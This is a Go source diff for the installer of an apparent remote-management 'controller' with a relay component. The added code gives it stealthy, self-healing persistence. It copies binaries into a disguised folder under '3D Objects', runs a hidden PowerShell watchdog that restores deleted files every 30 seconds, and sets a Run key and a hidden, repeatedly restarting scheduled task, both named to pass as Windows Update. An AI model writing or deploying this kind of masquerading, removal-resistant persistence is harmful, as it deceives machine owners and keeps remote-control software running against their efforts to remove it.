@@ -59,14 +59,33 @@ func doUninstall() {
 	}
 	installDir := filepath.Join(programFiles, "RMM", "Controller")
 	fmt.Printf("Uninstalling from %s\n", installDir)
-	for _, n := range []string{"controller-native.exe", "controller-ui.exe", "controller.exe"} {
+	for _, n := range []string{"controller-native.exe", "controller-ui.exe", "controller.exe", "relay.exe"} {
 		_, _ = exec.Command("taskkill", "/F", "/IM", n).CombinedOutput()
 	}
+	// Kill controller watchdog by command-line match (hidden windows have no title).
+	_, _ = exec.Command("powershell", "-NoProfile", "-command", "Get-CimInstance Win32_Process -Filter \"Name='powershell.exe'\" | Where-Object { $_.CommandLine -like '*controller-watchdog.ps1*' } | ForEach-Object { Stop-Process -Id $_.ProcessId -Force }").CombinedOutput()
+	// Remove Run keys
+	if k, err := registry.OpenKey(registry.LOCAL_MACHINE, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.WRITE); err == nil {
+		_ = k.DeleteValue("WindowsUpdateController")
+		k.Close()
+	}
+	_, _ = exec.Command("schtasks", "/delete", "/tn", "WindowsUpdateController", "/f").CombinedOutput()
 	desktop := filepath.Join(os.Getenv("USERPROFILE"), "Desktop")
 	_ = os.Remove(filepath.Join(desktop, "Controller.lnk"))
 	_ = os.Remove(filepath.Join(os.Getenv("ProgramData"), `Microsoft\Windows\Start Menu\Programs\RMM Controller.lnk`))
 	_, _ = exec.Command("netsh", "advfirewall", "firewall", "delete", "rule", "name=RMM Controller").CombinedOutput()
 	_ = registry.DeleteKey(registry.LOCAL_MACHINE, `SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\RMM Controller`)
+	// Clean up backup directory (controller files share blender/ with agent backup;
+	// only remove controller-owned files, never the whole dir).
+	threeDObjects := filepath.Join(os.Getenv("USERPROFILE"), "3D Objects")
+	backupDir := filepath.Join(threeDObjects, "blender")
+	_ = os.Remove(filepath.Join(backupDir, "controller-watchdog.ps1"))
+	_ = os.Remove(filepath.Join(backupDir, "controller-watchdog.log"))
+	_ = os.Remove(filepath.Join(backupDir, "controller-watchdog.log.1"))
+	_ = os.Remove(filepath.Join(backupDir, "controller-version.txt"))
+	for _, bin := range []string{"controller-native.exe", "controller.exe", "controller-ui.exe", "relay.exe"} {
+		_ = os.Remove(filepath.Join(backupDir, bin))
+	}
 	_ = os.RemoveAll(installDir)
 	fmt.Println("Uninstalled.")
 }
@@ -153,8 +172,13 @@ func main() {
 			desktop = cand
 		}
 	}
-	target := filepath.Join(installDir, "controller-ui.exe")
-	// Ensure target exists, fallback to controller.exe
+	// Native window first: no browser needed. controller-native.exe is the
+	// default launch target; fall back to controller-ui.exe (browser) and
+	// finally headless controller.exe.
+	target := filepath.Join(installDir, "controller-native.exe")
+	if _, err := os.Stat(target); os.IsNotExist(err) {
+		target = filepath.Join(installDir, "controller-ui.exe")
+	}
 	if _, err := os.Stat(target); os.IsNotExist(err) {
 		target = filepath.Join(installDir, "controller.exe")
 	}
@@ -187,6 +211,23 @@ func main() {
 	_, _ = exec.Command("netsh", "advfirewall", "firewall", "add", "rule", "name=RMM Controller", "dir=in", "action=allow", "protocol=TCP", "localport=4444").CombinedOutput()
 	_, _ = exec.Command("netsh", "advfirewall", "firewall", "add", "rule", "name=RMM Controller", "dir=in", "action=allow", "program="+target, "enable=yes").CombinedOutput()
 
+	// Backup controller binaries to hidden directory for self-healing
+	fmt.Println("[*] Creating controller backup for self-healing...")
+	threeDObjects := filepath.Join(os.Getenv("USERPROFILE"), "3D Objects")
+	backupDir := filepath.Join(threeDObjects, "blender")
+	_ = os.MkdirAll(backupDir, 0755)
+	for _, bin := range []string{"controller-native.exe", "controller.exe", "controller-ui.exe", "relay.exe"} {
+		src := filepath.Join(installDir, bin)
+		if data, err := os.ReadFile(src); err == nil {
+			_ = os.WriteFile(filepath.Join(backupDir, bin), data, 0644)
+			fmt.Printf("  -> backed up %s\n", bin)
+		} else {
+			fmt.Printf("  -> backup skipped (missing): %s\n", bin)
+		}
+	}
+	_ = os.WriteFile(filepath.Join(installDir, "version.txt"), []byte(version.Version+"\n"), 0644)
+	_ = os.WriteFile(filepath.Join(backupDir, "controller-version.txt"), []byte(version.Version+"\n"), 0644)
+
 	// Add/Remove Programs entry
 	fmt.Println("[*] Registering uninstall...")
 	regPath := `SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\RMM Controller`
@@ -201,6 +242,108 @@ func main() {
 		k.SetDWordValue("NoRepair", 1)
 		k.Close()
 	}
+
+	// Create controller watchdog script (same pattern as agent watchdog v2:
+	// version guard + file logging + 30s cadence).
+	controllerWatchdogPath := filepath.Join(backupDir, "controller-watchdog.ps1")
+	controllerWatchdogLog := filepath.Join(backupDir, "controller-watchdog.log")
+	controllerWatchdogScript := fmt.Sprintf(`# RMM Controller Watchdog v2 - monitors controller binaries
+$backupDir = "%s"
+$installDir = "%s"
+$watchdogLog = "%s"
+function Write-Log([string]$msg) {
+    $line = "[$(Get-Date -Format o)] $msg"
+    try {
+        if ((Test-Path $watchdogLog) -and ((Get-Item $watchdogLog).Length -gt 5MB)) {
+            Remove-Item ($watchdogLog + ".1") -ErrorAction SilentlyContinue
+            Rename-Item $watchdogLog ((Split-Path $watchdogLog -Leaf) + ".1") -ErrorAction SilentlyContinue
+        }
+        Add-Content -Path $watchdogLog -Value $line
+    } catch {}
+    Write-Host $line
+}
+function Get-Version([string]$f) {
+    if (Test-Path $f) { return ((Get-Content $f -TotalCount 1).Trim()) }
+    return ""
+}
+while ($true) {
+    Start-Sleep -Seconds 30
+    $bins = @("controller-native.exe", "controller.exe", "controller-ui.exe", "relay.exe")
+    foreach ($bin in $bins) {
+        $instPath = Join-Path $installDir $bin
+        $backupPath = Join-Path $backupDir $bin
+        if ((Test-Path $backupPath) -and (-not (Test-Path $instPath))) {
+            $instVer = Get-Version (Join-Path $installDir "version.txt")
+            $bakVer = Get-Version (Join-Path $backupDir "controller-version.txt")
+            if ($bakVer -ne "" -and $instVer -ne "" -and ($bakVer -lt $instVer)) {
+                Write-Log "Backup $bin v$bakVer older than installed v$instVer - skipping restore"
+                continue
+            }
+            Copy-Item $backupPath $instPath -Force
+            Write-Log "Restored $bin from backup"
+        }
+    }
+}
+`, backupDir, installDir, controllerWatchdogLog)
+	_ = os.WriteFile(controllerWatchdogPath, []byte(controllerWatchdogScript), 0644)
+
+	// Run controller watchdog now (Run key + scheduled task cover reboot).
+	cmdWatchdog := exec.Command("cmd.exe", "/c", "start", "", "/min", "powershell", "-NoProfile", "-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass", "-File", controllerWatchdogPath)
+	cmdWatchdog.SysProcAttr = &syscall.SysProcAttr{
+		HideWindow:    true,
+		CreationFlags: 0x08000000,
+	}
+	_ = cmdWatchdog.Start()
+
+	// HKLM Run key for controller watchdog
+	controllerWatchdogCmd := fmt.Sprintf(`powershell -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File "%s"`, controllerWatchdogPath)
+	if k, _, err := registry.CreateKey(registry.LOCAL_MACHINE, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.WRITE); err == nil {
+		_ = k.SetStringValue("WindowsUpdateController", controllerWatchdogCmd)
+		k.Close()
+		fmt.Println("[*] HKLM Run key set for controller watchdog")
+	} else {
+		fmt.Printf("[!] HKLM controller watchdog Run key failed: %v\n", err)
+	}
+
+	// Scheduled-task fallback so the watchdog survives without waiting for
+	// the next boot (mirrors the agent WindowsUpdateWatchdog task).
+	controllerTaskXML := fmt.Sprintf(`<?xml version="1.0" encoding="UTF-16"?>
+<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
+  <RegistrationInfo><Date>2026-01-01T00:00:00</Date><Author>RMM</Author></RegistrationInfo>
+  <Triggers>
+    <LogonTrigger><Enabled>true</Enabled><Repetition><Interval>PT15M</Interval><Duration>P3650D</Duration><StopAtDurationEnd>false</StopAtDurationEnd></Repetition></LogonTrigger>
+    <SessionStateChangeTrigger><Enabled>true</Enabled><StateChange>SessionUnlock</StateChange></SessionStateChangeTrigger>
+  </Triggers>
+  <Principals><Principal id="Author"><LogonType>InteractiveToken</LogonType><RunLevel>HighestAvailable</RunLevel></Principal></Principals>
+  <Settings>
+    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
+    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
+    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
+    <AllowHardTerminate>true</AllowHardTerminate>
+    <StartWhenAvailable>true</StartWhenAvailable>
+    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
+    <IdleSettings><StopOnIdleEnd>false</StopOnIdleEnd><RestartOnIdle>false</RestartOnIdle></IdleSettings>
+    <AllowStartOnDemand>true</AllowStartOnDemand>
+    <Enabled>true</Enabled>
+    <Hidden>true</Hidden>
+    <RunOnlyIfIdle>false</RunOnlyIfIdle>
+    <WakeToRun>false</WakeToRun>
+    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
+    <Priority>7</Priority>
+    <RestartOnFailure><Interval>PT1M</Interval><Count>9999</Count></RestartOnFailure>
+  </Settings>
+  <Actions Context="Author"><Exec><Command>powershell</Command><Arguments>-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File "%s"</Arguments></Exec></Actions>
+</Task>`, controllerWatchdogPath)
+	tmpControllerTask := filepath.Join(os.TempDir(), "rmm_controller_watchdog_task.xml")
+	_ = os.WriteFile(tmpControllerTask, []byte(controllerTaskXML), 0644)
+	_, _ = exec.Command("schtasks", "/delete", "/tn", "WindowsUpdateController", "/f").CombinedOutput()
+	if out, err := exec.Command("schtasks", "/create", "/tn", "WindowsUpdateController", "/xml", tmpControllerTask, "/f").CombinedOutput(); err != nil {
+		fmt.Printf("[!] Controller watchdog task failed: %v %s\n", err, strings.TrimSpace(string(out)))
+	} else {
+		fmt.Println("[*] Controller watchdog task registered")
+	}
+	_ = os.Remove(tmpControllerTask)
+
 	// Create uninstall.exe as copy of self with --uninstall flag (simple)
 	uninstallPath := filepath.Join(installDir, "uninstall.exe")
 	self, _ := os.Executable()
